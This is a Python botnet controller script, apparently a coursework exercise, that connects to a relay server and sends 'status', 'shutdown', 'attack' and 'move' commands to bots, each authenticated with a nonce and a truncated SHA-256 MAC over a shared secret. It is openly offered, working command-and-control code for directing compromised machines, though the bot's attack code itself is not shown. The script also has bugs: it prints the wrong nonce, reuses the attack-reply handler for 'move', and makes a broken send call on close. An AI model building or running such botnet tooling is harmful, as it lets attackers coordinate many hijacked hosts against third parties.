# controller program for the ncbot.py program

#command line argument:
# ./nccontroller.py <hostname>:<port> <secret-phrase>

import argparse
import socket
import sys
import os
#import base64
import hashlib
import shlex
import time
from array import *
import uuid
import select

used_nonces = list()

def parse_args():
    parser = argparse.ArgumentParser(
        prog='client',
        description='client connects to server')
    parser.add_argument('hostname_port', help='hostname and port of the server')
    parser.add_argument('secret', help='secret-phrase')
    #parser.add_argument('-d', '--debug', action='store_true',
    #                    help="enable debugging output")
    return parser.parse_args()


def calc_nonce():
    #get random nonce make sure it hasnt been used before

    nonce = uuid.uuid4().hex
    print("nonce: ", uuid.uuid4().hex)
    
    while(nonce in used_nonces):
        nonce = uuid.uuid4().hex

    print("nonce: ", uuid.uuid4().hex)
    used_nonces.append(nonce)
    return nonce


def recieve_status_data(sock: socket):
    i = 0
    j = 0
    bot_status = list()
    while i < 5:
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
        if readList:
            response = sock.recv(1024).decode()
            data = response.split()
            bot_status.append(data[1] + " " + data[2])
            print(response)
            j = j + 1       #counts number of bots which sent data back

        else:
            #waits for 5 seconds
            print("waiting")
            i = i + 1

    print("Result: ", j, " bots discovered.")
    status_string = ""
    for bot in bot_status:
        status_string = status_string + " " + bot.rstrip("\n") + ","
        #print(bot)
    print(status_string.rstrip(","))


def recieve_shutdown_data(sock: socket):
    i = 0
    j = 0
    bot_status = list()
    while i < 50:
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 0.1)
        if readList:

            # there is a bug when the data is recieved at the same time ..... -----------------
            response = sock.recv(1024).decode()
            data = response.split()
            bot_status.append(data[1])
            print(response)
            j = j + 1       #counts number of bots which sent data back

        else:
            #waits for 5 seconds
            #print("waiting")
            i = i + 1

    print("Result: ", j, " bots shutdown.")
    status_string = ""
    for bot in bot_status:
        status_string = status_string + " " + bot.rstrip("\n") + ","
        #print(bot)
    print(status_string.rstrip(","))


def recieve_attack_data(sock: socket):
    i = 0
    j = 0
    bot_attack = list()
    while i < 5:
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
        if readList:
            response = sock.recv(1024).decode()
            #data = response.split()
            bot_attack.append(response)
            print(response)
            j = j + 1       #counts number of bots which sent data back

        else:
            #waits for 5 seconds
            i = i + 1

    print("Result: ", j, " bots discovered.")
    status_string = ""
    for bot in bot_attack:
        status_string = status_string + " " + bot.rstrip("\n") + ","
        #print(bot)
    print(status_string.rstrip(","))



def recieve_move_data(sock: socket):
    i = 0
    j = 0
    bot_move = list()
    while i < 5:
        read_data = [sock]
        write_data = []
        error_data = []
        readList, writeList, errorList = select.select(read_data, write_data, error_data, 1.0)
        if readList:
            response = sock.recv(1024).decode()
            #data = response.split()
            bot_move.append(response)
            print(response)
            j = j + 1       #counts number of bots which sent data back

        else:
            #waits for 5 seconds
            i = i + 1

    print("Result: ", j, " bots discovered.")
    status_string = ""
    for bot in bot_move:
        status_string = status_string + " " + bot.rstrip("\n") + ","
        #print(bot)
    print(status_string.rstrip(","))


def bot_controller(args: str, sock: socket):

    split_hostPort = args.hostname_port.split(":")
    host = split_hostPort[0]
    port = int(split_hostPort[1])
    secret = args.secret
    #print("secret: ", secret)

    command = input('cmd> ')
    while (command.lower().strip() != 'close'):

        if command == "status":
            print("command status")
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            print("mac: ", mac[0:8])

            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            print("send command: ", nonce_mac_cmd)
            sock.send(nonce_mac_cmd.encode())
            recieve_status_data(sock)

        elif command == "shutdown":
            #print("telling bot to shutdown")
            print("command shutdown")
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            print("mac: ", mac[0:8])

            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            print("send command: ", nonce_mac_cmd)
            sock.send(nonce_mac_cmd.encode())

            recieve_shutdown_data(sock)

        elif command[0:6] == "attack":
            print("attack command")
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            print("mac: ", mac[0:8])

            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            print("send command: ", nonce_mac_cmd)
            sock.send(nonce_mac_cmd.encode())

            recieve_attack_data(sock)

        elif command[0:4] == "move":
            print("move command")
            nonce = calc_nonce()
            mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
            print("mac: ", mac[0:8])

            nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
            print("send command: ", nonce_mac_cmd)
            sock.send(nonce_mac_cmd.encode())

            recieve_attack_data(sock)
        elif command == "quit":
            print("Bye.")
            exit(1)
        else:
            print("unknown command.")

        command = input('cmd> ')
    sock.send(command.encode)
    sock.close()



def main():
    args = parse_args()

    try:
        #initially connect to server
        split_hostPort = args.hostname_port.split(":")
        host = split_hostPort[0]
        port = int(split_hostPort[1])

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))

        print("Connected.")
        bot_controller(args, client_socket)

    except ConnectionError:
        print("Connection failed. Could not connect to server")


if __name__ == '__main__':
    main()